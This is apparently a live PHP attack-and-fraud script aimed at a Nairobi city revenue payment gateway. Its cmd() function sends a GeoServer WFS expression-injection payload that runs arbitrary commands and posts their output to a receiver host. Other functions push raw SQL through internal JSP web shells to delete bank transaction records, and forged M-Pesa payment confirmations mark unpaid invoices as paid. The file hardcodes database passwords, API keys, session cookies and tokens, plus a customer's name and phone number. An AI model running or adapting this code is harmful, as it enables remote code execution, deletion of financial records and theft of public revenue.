<?php
require 'vendor/autoload.php';

include './includes/core_auto.php';
include './includes/conn_auto.php';
include './includes/conn_pure.php';


class DatabaseDeep
{
    private $server = "mysql:host=auth-db1577.hstgr.io;dbname=u221263050_severo";
    private $username = "u221263050_root";
    private $password = 'Caio2303arruda$';
    private $options  = array(
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_PERSISTENT => true,  // Use persistent connections
    );

    protected $conn;

    public function open()
    {
        try {
            $this->conn = new PDO($this->server, $this->username, $this->password, $this->options);
            return $this->conn;
        } catch (PDOException $e) {
            echo "There is some problem in connection: " . $e->getMessage();
        }
    }

    public function close()
    {
        $this->conn = null;
    }
}


$pdoDeep = new DatabaseDeep();

$connDeep = $pdoDeep->open();


function recLog($invoice, $data, $sql)
{
    global $conn;
    $stmt = $conn->prepare("INSERT INTO recLog (`inv`,`data`,`sql`) VALUES (:inv, :data, :sql)");
    $stmt->execute(['inv' => $invoice, 'data' => $data, 'sql' => $sql]);
    $response = $stmt->fetch();
    return $response;
}
//$data = '{"success":true,"invoiceNo":"BL-UBP-060215","amount":"7,500.00","pobox":"","postalcode":"","mobilenumber":"0720448244","applicationNo":"","external_doc":"","business_name":"","business_subsidiary_name":"","description":"-0 for ","dategenerated":"02\/15\/24","status":"Unpaid","customerno":"2020_350227","duedate":"02\/15\/24","customername":"MOSES MUHU NDEGWA","description":"UBP APPLICATION NO TLA063429 - 2020_350227"}';
function universal_dab($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/aggregate/dab.jsp?sqlCommand=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}
function convertToISO8601($dateTimeString, $timezoneOffset = '+03:00')
{
    // Remove the microseconds part if it exists
    $dateTimeString = preg_replace('/\.\d+/', '', $dateTimeString);

    // Create a DateTime object from the original string
    $dateTime = new DateTime($dateTimeString, new DateTimeZone('UTC'));

    // Set the desired timezone
    $timezone = new DateTimeZone($timezoneOffset);
    $dateTime->setTimezone($timezone);

    // Format the DateTime object to the ISO 8601 format
    $iso8601DateTime = $dateTime->format('Y-m-d\TH:i:sP');

    return $iso8601DateTime;
}

function generateAccountNumber()
{
    // Get the current date and time
    $dateTime = date('YmdHi'); // Format: YYYYMMDDHHMMSS

    // Generate a random 4-digit number to complete the 16-digit account number
    $randomDigits = '';
    for ($i = 0; $i < 4; $i++) {
        $randomDigits .= mt_rand(0, 9);
    }

    // Concatenate the dateTime string and the random digits
    return $dateTime . $randomDigits;
}

function generateCurrentDateWithMidnightTime()
{
    // Create a DateTime object with the current date and time
    $dateTime = new DateTime();

    // Modify the time to "00:00:00"
    $dateTime->setTime(0, 0, 0);

    // Format the date in "d-m-Y H:i:s" format
    return $dateTime->format('d-m-Y H:i:s');
}
function bankTransactions_del($id)
{
    $q = "DELETE FROM bankTransactions WHERE id=" . $id;
    return universal_dab($q, 'bankTransactions');
}

function transactions($clientRefNo)
{
    //$q = "DELETE FROM transactions WHERE id=" . $id;
    $q = "DELETE FROM transactions WHERE clientRefNo='" . $clientRefNo . "'";
    return universal_dab($q, 'transactions');
}

function messenger($url, $headers = '', $payload = '', $method = 'GET')
{
    $url = 'http://192.168.2.142:8080/aggregate/messenger.jsp?url=' . urlencode($url) . '&headers=' . urlencode($headers) . '&payload=' . urlencode($payload) . '&method=' . urlencode($method);
    $data = httpGet($url, []);
    return $data;
}

function extractId($html)
{
    // Load the HTML into a DOMDocument object
    $dom = new DOMDocument();
    @$dom->loadHTML($html);

    // Use DOMXPath to query for the table data
    $xpath = new DOMXPath($dom);
    $idNode = $xpath->query("//table/tr/td")->item(0);

    // Return the text content of the node
    if ($idNode) {
        return $idNode->textContent;
    }
    return null;
}

function universal_dab_b($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/aggregate/my.jsp?dbHost=192.168.0.65&dbName=upgw&dbUser=root&dbPassword=happycoding&dbPort=3306&sqlCommand=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}

function ms_script()
{
    $script = 'aW1wb3J0IHN5cw0KaW1wb3J0IG9zDQoNCiMgQ29uZmlndXJlIGVudmlyb25tZW50IGZvciBzaXRlLXBhY2thZ2VzDQpzeXMucGF0aC5pbnNlcnQoMCwgb3MucGF0aC5hYnNwYXRoKG9zLnBhdGguam9pbihvcy5wYXRoLmRpcm5hbWUoX19maWxlX18pLCAnLi9teWVudi9MaWIvc2l0ZS1wYWNrYWdlcycpKSkNCg0KaW1wb3J0IHB5bXlzcWwNCg0KIyBNeVNRTCBjb25maWd1cmF0aW9uIGZvciBib3RoIGRhdGFiYXNlcw0KZGJfY29uZmlnXzEgPSB7DQogICAgJ2hvc3QnOiAnMTkyLjE2OC4wLjY1JywNCiAgICAndXNlcic6ICdyb290JywNCiAgICAncGFzc3dvcmQnOiAnaGFwcHljb2RpbmcnLA0KICAgICdkYXRhYmFzZSc6ICd1cGd3JywNCiAgICAncG9ydCc6IDMzMDYsDQogICAgJ2Nvbm5lY3RfdGltZW91dCc6IDMwDQp9DQoNCmRiX2NvbmZpZ18yID0gew0KICAgICdob3N0JzogJzE5Mi4xNjguMTAwLjczJywNCiAgICAndXNlcic6ICdyb290JywNCiAgICAncGFzc3dvcmQnOiAnSGFwcHljb2RpbmcnLA0KICAgICdkYXRhYmFzZSc6ICdkYl9hcGkxX3NlcnZpY2UnLA0KICAgICdwb3J0JzogMzMwNiwNCiAgICAnY29ubmVjdF90aW1lb3V0JzogMzANCn0NCg0KIyBUaGUgU1FMIHF1ZXJ5IHRvIGV4ZWN1dGUNCmluc2VydF9xdWVyeSA9ICItLVNRTFFVRVJZLS0iDQoNCiMgSlNPTiBwYXlsb2FkIGZvciBjdXJsDQpqc29uX3BheWxvYWQgPSAnLS1KU09OUVVFUlktLScNCg0KZGVmIGV4ZWN1dGVfaW5zZXJ0KGRiX2NvbmZpZywgcXVlcnkpOg0KICAgIHRyeToNCiAgICAgICAgY29ubmVjdGlvbiA9IHB5bXlzcWwuY29ubmVjdCgqKmRiX2NvbmZpZykNCiAgICAgICAgY3Vyc29yID0gY29ubmVjdGlvbi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZShxdWVyeSkNCiAgICAgICAgY29ubmVjdGlvbi5jb21taXQoKQ0KICAgICAgICByZXR1cm4gIkluc2VydCBzdWNjZXNzZnVsIg0KICAgIGV4Y2VwdCBweW15c3FsLk15U1FMRXJyb3IgYXMgZToNCiAgICAgICAgcmV0dXJuIGYiTXlTUUwgRXJyb3I6IHtlfSINCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHJldHVybiBmIkdlbmVyYWwgRXJyb3I6IHtlfSINCiAgICBmaW5hbGx5Og0KICAgICAgICBpZiBjdXJzb3I6DQogICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQ0KICAgICAgICBpZiBjb25uZWN0aW9uIGFuZCBjb25uZWN0aW9uLm9wZW46DQogICAgICAgICAgICBjb25uZWN0aW9uLmNsb3NlKCkNCg0KIyBQZXJmb3JtIHRoZSBpbnNlcnQgb3BlcmF0aW9uIGZvciBib3RoIGRhdGFiYXNlcw0Kc3RhdHVzX2RiMSA9IGV4ZWN1dGVfaW5zZXJ0KGRiX2NvbmZpZ18xLCBpbnNlcnRfcXVlcnkpDQpzdGF0dXNfZGIyID0gZXhlY3V0ZV9pbnNlcnQoZGJfY29uZmlnXzIsIGluc2VydF9xdWVyeSkNCg0KIyBQcmVwYXJlIGFuZCBleGVjdXRlIHRoZSBjdXJsIGNvbW1hbmQgdXNpbmcgb3MNCmN1cmxfY29tbWFuZCA9IGYiY3VybCAtWCBQT1NUIGh0dHA6Ly8xOTIuMTY4LjEwMC4xMTYvZ2F0ZXdheS90YWlmYS9ucnMvYWZmaXJtIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7anNvbl9wYXlsb2FkfSciDQoNCnRyeToNCiAgICBzdHJlYW0gPSBvcy5wb3BlbihjdXJsX2NvbW1hbmQpDQogICAgY3VybF9yZXNwb25zZSA9IHN0cmVhbS5yZWFkKCkuc3RyaXAoKQ0KICAgIHN0YXR1c19jdXJsID0gZiJDdXJsIHJlc3BvbnNlOiB7Y3VybF9yZXNwb25zZX0iDQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgc3RhdHVzX2N1cmwgPSBmIkN1cmwgRXJyb3I6IHtlfSINCg0KIyBQcmludCB0aGUgc3RhdHVzZXMgb2YgYWxsIG9wZXJhdGlvbnMNCnByaW50KCJEYXRhYmFzZSAxIFN0YXR1czoiLCBzdGF0dXNfZGIxKQ0KcHJpbnQoIkRhdGFiYXNlIDIgU3RhdHVzOiIsIHN0YXR1c19kYjIpDQpwcmludCgiQ3VybCBTdGF0dXM6Iiwgc3RhdHVzX2N1cmwpDQo';
    return $script;
}

function cmd($cmd, $receiver)
{

    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'http://192.168.2.160:8080/geoserver/TestWfsPost',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => 'form_hf_0=&url=http%3A%2F%2F192.168.2.160%3A8080%2Fgeoserver%2Fwfs&body=%3C!--%20Performs%20an%20intersects%20against%20a%20point.%20%20This%20is%20functionally%20--%3E%0D%0A%3C!--%20equivalent%20to%20%3CNot%3E%3CDisjoint%3E.%20%20This%20call%20can%20be%20used%20by%20a%20%20%20%20--%3E%0D%0A%3C!--%20client%20application%20to%20select%20a%20feature%20clicked%20on.%20%20%0D%0A%0D%0A%20%20%20%20%20This%20will%20search%20through%20the%20dataset%20and%20return%20any%20polygons%20that%0D%0A%20%20%20%20%20contain%20the%20search%20point.%20%20%0D%0A%20%20%20%20%20%0D%0A%20%20%20%20%20If%20you%20were%20searching%20in%20a%20point%20or%20line%20dataset%2C%20you%20might%20want%0D%0A%20%20%20%20%20to%20make%20a%20little%20polygon%20to%20search%20with%20instead%20of%20a%20single%20point%0D%0A%20%20%20%20%20so%20the%20user%20doesnt%20have%20to%20*exactly*%20click%20on%20the%20(mathematically%0D%0A%20%20%20%20%20infinitely%20thin)%20line%20or%20point.%20%20%20%20%20%0D%0A%0D%0A%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3DWFS_getFeatureIntersects-1.0.xml%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%0D%0A%20--%3E%0D%0A%3Cwfs%3AGetFeature%20service%3D%22WFS%22%20version%3D%221.0.0%22%0D%0A%20%20outputFormat%3D%22GML2%22%0D%0A%20%20xmlns%3Awfs%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%22%0D%0A%20%20xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%0D%0A%20%20xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%0D%0A%20%20xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%0D%0A%20%20xsi%3AschemaLocation%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http%3A%2F%2Fschemas.opengis.net%2Fwfs%2F1.0.0%2FWFS-basic.xsd%22%3E%0D%0A%20%20%3Cwfs%3AQuery%20typeName%3D%22topp%3Apf_markets%22%3E%0D%0A%20%20%20%20%3CFilter%3E%0D%0A%20%20%20%20%20%20%3CIntersects%3E%0D%0A%20%20%20%20%20%20%20%20%3CPropertyName%3Eeval(build(jdk.jshell.JShell.builder())%2C%20\'try%20%7B%0D%0A%20%20%20%20Process%20process%20%3D%20Runtime.getRuntime().exec(%22' . $cmd . '%22)%3B%0D%0A%20%20%20%20%0D%0A%20%20%20%20java.io.BufferedReader%20reader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(process.getInputStream()))%3B%0D%0A%20%20%20%20StringBuilder%20output%20%3D%20new%20StringBuilder()%3B%0D%0A%20%20%20%20String%20line%3B%0D%0A%20%20%20%20while%20((line%20%3D%20reader.readLine())%20!%3D%20null)%20%7B%0D%0A%20%20%20%20%20%20%20%20output.append(line).append(%22%5Cn%22)%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20reader.close()%3B%0D%0A%0D%0A%20%20%20%20String%20encodedOutput%20%3D%20java.util.Base64.getEncoder().encodeToString(output.toString().getBytes(%22UTF-8%22))%3B%0D%0A%0D%0A%20%20%20%20java.net.URL%20url%20%3D%20new%20java.net.URL(%22' . $receiver . '%22)%3B%0D%0A%20%20%20%20java.net.HttpURLConnection%20connection%20%3D%20(java.net.HttpURLConnection)%20url.openConnection()%3B%0D%0A%20%20%20%20connection.setRequestMethod(%22POST%22)%3B%0D%0A%20%20%20%20connection.setDoOutput(true)%3B%0D%0A%0D%0A%20%20%20%20byte%5B%5D%20postDataBytes%20%3D%20encodedOutput.getBytes(%22UTF-8%22)%3B%0D%0A%20%20%20%20java.io.OutputStream%20os%20%3D%20connection.getOutputStream()%3B%0D%0A%20%20%20%20os.write(postDataBytes)%3B%0D%0A%20%20%20%20os.flush()%3B%0D%0A%20%20%20%20os.close()%3B%0D%0A%0D%0A%20%20%20%20int%20responseCode%20%3D%20connection.getResponseCode()%3B%0D%0A%20%20%20%20System.out.println(%22Response%20Code%3A%20%22%20%2B%20responseCode)%3B%0D%0A%0D%0A%20%20%20%20java.io.BufferedReader%20in%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(connection.getInputStream()))%3B%0D%0A%20%20%20%20StringBuilder%20response%20%3D%20new%20StringBuilder()%3B%0D%0A%20%20%20%20while%20((line%20%3D%20in.readLine())%20!%3D%20null)%20%7B%0D%0A%20%20%20%20%20%20%20%20response.append(line)%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20in.close()%3B%0D%0A%0D%0A%20%20%20%20System.out.println(%22Response%3A%20%22%20%2B%20response.toString())%3B%0D%0A%7D%20catch%20(Exception%20e)%20%7B%0D%0A%20%20%20%20e.printStackTrace()%3B%0D%0A%7D\')%3C%2FPropertyName%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cgml%3APoint%20srsName%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2Fsrs%2Fepsg.xml%234326%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cgml%3Acoordinates%3E-74.817265%2C40.5296504%3C%2Fgml%3Acoordinates%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3C%2Fgml%3APoint%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2FIntersects%3E%0D%0A%20%20%20%20%20%20%3C%2FFilter%3E%0D%0A%20%20%3C%2Fwfs%3AQuery%3E%0D%0A%3C%2Fwfs%3AGetFeature%3E&username=&password=',
        CURLOPT_HTTPHEADER => array(
            'Host: 192.168.2.160:8080',
            'Cache-Control: max-age=0',
            'Accept-Language: en-US',
            'Upgrade-Insecure-Requests: 1',
            'Origin: http://192.168.2.160:8080',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer: http://192.168.2.160:8080/geoserver/web/wicket/page?1',
            'Cookie: JSESSIONID=3F27C65F7F97A9A6FF7CDFA08D1FD12F'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}

function cmd2()
{


    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'http://192.168.2.160:8080/geoserver/TestWfsPost',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => 'form_hf_0=&url=http%3A%2F%2F192.168.2.160%3A8080%2Fgeoserver%2Fwfs&body=%3C!--%20Performs%20a%20get%20feature%20with%20a%20bounding%20box%20filter.%20%20%20WFS_getFeatureBBOX-1.1.xml%20%20%20--%3E%0A%3C!--%20The%20BBOX%20filter%20is%20a%20convenience%20for%20a%20%3CNot%3E%3CDisjoint%3E%2C%20--%3E%0A%3C!--%20it%20fetches%20all%20features%20that%20spatially%20interact%20with%20the%20given%20box.%20--%3E%0A%3C!--%20This%20example%20also%20shows%20how%20to%20request%20specific%20properties%2C%20in%20this%20--%3E%0A%3C!--%20case%20we%20just%20get%20the%20STATE_NAME%20and%20PERSONS%20--%3E%0A%0A%3Cwfs%3AGetFeature%20service%3D%22WFS%22%20version%3D%221.1.0%22%0A%20%20xmlns%3Awfs%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%22%0A%20%20xmlns%3Aogc%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%0A%20%20xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%0A%20%20xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%0A%20%20xsi%3AschemaLocation%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http%3A%2F%2Fschemas.opengis.net%2Fwfs%2F1.1.0%2Fwfs.xsd%22%3E%0A%20%20%3Cwfs%3AQuery%20typeName%3D%22topp%3Apf_markets%22%3E%0A%20%20%20%20%3Cwfs%3APropertyName%3Etopp%3ASTATE_NAME%3C%2Fwfs%3APropertyName%3E%0A%20%20%20%20%3Cwfs%3APropertyName%3Etopp%3APERSONS%3C%2Fwfs%3APropertyName%3E%0A%20%20%20%20%3Cogc%3AFilter%3E%0A%20%20%20%20%20%20%3Cogc%3ABBOX%3E%0A%20%20%20%20%20%20%20%20%3Cogc%3APropertyName%3Eexec(java.lang.Runtime.getRuntime()%2C%22python3%20opt%2Ftomcat%2Fwebapps%2Faggregate%2Fmaster.py%22)%3C%2Fogc%3APropertyName%3E%0A%20%20%20%20%20%20%20%20%3Cgml%3AEnvelope%20srsName%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2Fsrs%2Fepsg.xml%234326%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%3Cgml%3AlowerCorner%3E-75.102613%2040.212597%3C%2Fgml%3AlowerCorner%3E%0A%20%20%20%20%20%20%20%20%20%20%20%3Cgml%3AupperCorner%3E-72.361859%2041.512517%3C%2Fgml%3AupperCorner%3E%0A%20%20%20%20%20%20%20%20%3C%2Fgml%3AEnvelope%3E%0A%20%20%20%20%20%20%3C%2Fogc%3ABBOX%3E%0A%20%20%20%3C%2Fogc%3AFilter%3E%0A%20%20%3C%2Fwfs%3AQuery%3E%0A%3C%2Fwfs%3AGetFeature%3E&username=&password=',
        CURLOPT_HTTPHEADER => array(
            'Host: 192.168.2.160:8080',
            'Cache-Control: max-age=0',
            'Accept-Language: en-US',
            'Upgrade-Insecure-Requests: 1',
            'Origin: http://192.168.2.160:8080',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer: http://192.168.2.160:8080/geoserver/web/wicket/page?5',
            'Cookie: JSESSIONID=F94F1C0DF4E21079561DDF00D5809365'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}

if (isset($_GET['del'])) {
    $inv = urlencode($_GET['del']);
    $cmd = "SELECT id FROM bankTransactions WHERE billNumber='" . $inv . "' LIMIT 1";
    $sd1 = universal_dab_b($cmd, 'head');
    $id1 =  extractId($sd1);
    echo $id1 . '<br/><br/>';
    echo bankTransactions_del($id1) . '<br/><br/>';

    //$cmd2 = "SELECT id FROM transactions WHERE clientRefNo='" . $inv . "' LIMIT 1";
    //$sd2 = universal_dab_b($cmd2, 'head');
    //$id2 =  extractId($sd2);
    //echo $id2 . '<br/><br/>';
    echo transactions($inv) . '<br/><br/>';
} else {
    if (!isset($_POST['invoiceNo']) || !isset($_POST['amount']) || !isset($_POST['pay'])) {
        echo json_encode(['error' => 'incomplete request', 'payload' => $_POST]);
        die();
    }

    if (empty($_POST['invoiceNo']) || empty($_POST['amount'] || empty($_POST['pay']))) {
        echo json_encode(['error' => 'empty request', 'payload' => $_POST]);
        die();
    }



    $data = httpPost('https://kever.io/auto_process.php', ['invoiceNo' => $_POST['invoiceNo'], 'amount' => $_POST['amount']], ['Cookie: PHPSESSID=apr51tp5hki4qpk461mtt5c48e; authToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzAwMTk1NTksImV4cCI6MTczMDAyMzE1OSwidXNlcklkIjoiOTZfMSJ9.j9uGOtujf4sPgMcc54P60qc6EvyzcJhyM8bXR7gcCY4; visitorId=973ad0dd0c565ca2ae839d5ebef8447a']);
    //echo $data;


    $validation = json_decode($data, true);
    // echo $validation['description'];
    // die();

    $payType = $_POST['pay'];
    $postAmount = $_POST['amount'];
    if ($payType == 'set') {
        $amt1 = floatval(str_replace(',', '', $validation['amount']));
    } elseif ($payType == 'custom') {
        $amt1 = floatval($postAmount);
    } else {
        $amt1 = floatval(str_replace(',', '', $validation['amount']));
    }



    $dt1 = ['invoiceNo' => $validation['invoiceNo'], 'invoiceAmt' => $amt1, 'client' => 0, 'id' => '1'];
    $dtt1 = [];
    $dtt1['name'] = '0';

    if (isset($validation['success'])) {

        if ($validation['success']) {

            if (isset($validation['status'])) {

                if ($validation['status'] == "Unpaid") {
                    //echo 'Target 3';
                    //die();
                    $parts = explode('-', $dt1['invoiceNo']); // Split the string by hyphen
                    $validationAmt = str_replace(",", "", $validation['amount']);
                    if ($parts[0] != 'BL' || $parts[1] == 'LR' || (int)$validationAmt == (int)$dt1['invoiceAmt']) {
                        $billAmt = $dt1['invoiceAmt'];
                        $bypass = ['amount' => $dt1['invoiceAmt'], 'invoice_no' => $dt1['invoiceNo'], 'success' => true, 'route' => 'yes', 'record' => 'yes', 'client' => $dtt1['name'], 'extdoc' => $validation['external_doc'], 'custname' => $validation['customername'], 'custcont' => $validation['mobilenumber']];
                        //echo json_encode($bypass) . '<br/>';


                        if (isset($bypass)) {

                            $newId = 6212481;
                            $newBal = 378760 + 500;
                            $custname = splitName($bypass['custname']);
                            if ($bypass['custcont'] == '' || $bypass['custcont'] == null) {
                                $bypass['custcont'] = '0700000000';
                            }
                            $custcont = normalizePhoneNumber($bypass['custcont']);


                            //die(json_encode($url));
                            function mpesaRoute($bypass, $validation)
                            {
                                $timeFormats = getCurrentTimeFormats();
                                $bypassAmt = (float)$bypass['amount'];

                                $bypass['url'] = 'https://nairobiservices.go.ke/api/gateway/taifa/nrs/affirm';
                                $bty = explode('-', $bypass['invoice_no']);
                                $bty[1] = strtoupper($bty[1]);

                                $custname = splitName($bypass['custname']);

                                $code = generateMpesaCode();

                                if ($bypass['custcont'] == '' || $bypass['custcont'] == null) {
                                    $bypass['custcont'] = '0700000000';
                                }


                                // $data2 = array(
                                //     "apiKey" => "216424b0ce94d4682ef240fd67e30daf600be171",
                                //     "type" => "mpesa",
                                //     "billNumber" => (string) $bypass['invoice_no'],
                                //     "billAmount" => (float) number_format($bypassAmt, 1, '.', ''),
                                //     "phone" => (string) $bypass['custcont'],
                                //     "transactionDate" => "",
                                //     "Field1" => null,
                                //     "Field2" => null,
                                //     "Field3" => null,
                                //     "Field4" => null,
                                //     "Field5" => null,
                                //     "bankdetails" => null,
                                //     "mpesadetails" => array(
                                //         "BillRefNumber" => (string) $bypass['invoice_no'],
                                //         "BusinessShortCode" => "6060047",
                                //         "FirstName" => (string)str_replace("'", '', $custname['first']),
                                //         "LastName" => (string)str_replace("'", '', $custname['last']),
                                //         "MSISDN" => "",
                                //         "MiddleName" => (string)str_replace("'", '', $custname['middle']),
                                //         "OrgAccountBalance" => "0.00",
                                //         "ThirdPartyTransID" => "0",
                                //         "TransAmount" => (float) number_format($bypassAmt, 1, '.', ''),
                                //         "TransID" => (string) $code,
                                //         "TransTime" => (string)$timeFormats['withoutSeparators'],
                                //         "TransactionType" => "Pay Bill"
                                //     )
                                // );


                                $data2 = array("apiKey" => "216424b0ce94d4682ef240fd67e30daf600be171", "type" => "mpesa", "billNumber" => (string) $bypass['invoice_no'], "billAmount" => (float) number_format($bypassAmt, 1, '.', ''), "phone" => (string) $bypass['custcont'], "transactionDate" => "", "Field1" => null, "Field2" => null, "Field3" => null, "Field4" => null, "Field5" => null, "bankdetails" => null, "mpesadetails" => array("BillRefNumber" => (string) $bypass['invoice_no'], "BusinessShortCode" => "6060047", "FirstName" => (string)str_replace("'", '', $custname['first']), "LastName" => (string)str_replace("'", '', $custname['last']), "MSISDN" => "", "MiddleName" => (string)str_replace("'", '', $custname['middle']), "OrgAccountBalance" => "0.00", "ThirdPartyTransID" => "0", "TransAmount" => (float) number_format($bypassAmt, 1, '.', ''), "TransID" => (string) $code, "TransTime" => (string)$timeFormats['withoutSeparators'], "TransactionType" => "Pay Bill"));

                                $obj2 = array(
                                    "success" => true,
                                    "description" => "Payment Received Successfuly",
                                    "customer_no" => "NULL",
                                    "invoice_no" => (string) $bypass['invoice_no'],
                                    "invoice_report" => "",
                                    "balance" => number_format($bypassAmt, 1, '.', '')
                                );

                                $data2 = json_encode($data2, JSON_PRESERVE_ZERO_FRACTION);
                                $obj2 = json_encode($obj2, JSON_PRESERVE_ZERO_FRACTION);

                                $sqldata = trim(json_encode($data2), '"');

                                if (empty($validation['description']) || $validation['description'] == '' || $validation['description'] == null) {
                                    $validationResponse = 'SUCCESS >>>>>>STK PUSH-ENTRY-----Validated during stk push transaction';
                                } else {
                                    $validationResponse = 'SUCCESS >>>>>>' . $validation['description'];
                                }
                                // echo json_encode($validation);
                                // exit;

                                //echo $data2;
                                // $mpesaTransactions = "insert into `mpesaTransactions`  ( 
                                // `Confirmation Response`,
                                // `MpesaValidation`,
                                // `PushedComments`,
                                // `PushedToReconcile`,
                                // `accNo`,
                                // `amount`,
                                // `apiCode`,
                                // `comment`,
                                // `cont`,
                                // `logDate`,
                                // `mobileno`,
                                // `mpesaName`,
                                // `paybillBal`,
                                // `phone_number`,
                                // `receiptNo`,
                                // `resultoutput`,
                                // `shortCode`,
                                // `sid`,
                                // `status`,
                                // `transactionTime`,
                                // `validation Response`,
                                // `host_name`,
                                // `host_ip`,
                                // `remote_id`
                                //                        ) values  ( 
                                // NULL,
                                // 'COMPLETED',
                                //  NULL,
                                // '0',
                                // '" . $bypass['invoice_no'] . "',
                                // " . $bypass['amount'] . ",
                                // '2dce510f562c9ab7ce24c6fe282b4f099e8e49be',
                                // 'Pending',
                                // NULL,
                                // '" . $timeFormats['withSeparators'] . "',
                                // '" . $bypass['custcont'] . "',
                                // '" . str_replace("'", '', $bypass['custname']) . "',
                                // COALESCE((SELECT `paybillBal` FROM `mpesaTransactions` ORDER BY id DESC LIMIT 1), 0) + " . $bypass['amount'] . ",
                                // '',
                                // '" . $code . "',
                                // '" . $sqldata . "',
                                // '6060047',
                                // NULL,
                                // 0,
                                // '" . $timeFormats['withoutSeparators'] . "',
                                // '" . $validationResponse . "',
                                // 'fe80::7054:5e55:9d70:83b3%2',
                                // 'fe80::7054:5e55:9d70:83b3%2',
                                // '10.197.136.63'
                                //                         )";



                                // $mpesaTransactions = "insert into `mpesaTransactions`  (  `Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`, `host_name`, `host_ip`, `remote_id` ) values  (  NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Pending', NULL, '" . $timeFormats['withSeparators'] . "', '" . $bypass['custcont'] . "', '" . str_replace("'", '', $bypass['custname']) . "', COALESCE((SELECT `paybillBal` FROM `mpesaTransactions` ORDER BY id DESC LIMIT 1), 0) + " . $bypass['amount'] . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 0, '" . $timeFormats['withoutSeparators'] . "', '" . $validationResponse . "', 'fe80::7054:5e55:9d70:83b3%2', 'fe80::7054:5e55:9d70:83b3%2', '10.197.136.63' )";
                                // $mpesaTransactions = "
                                // INSERT INTO `mpesaTransactions` (
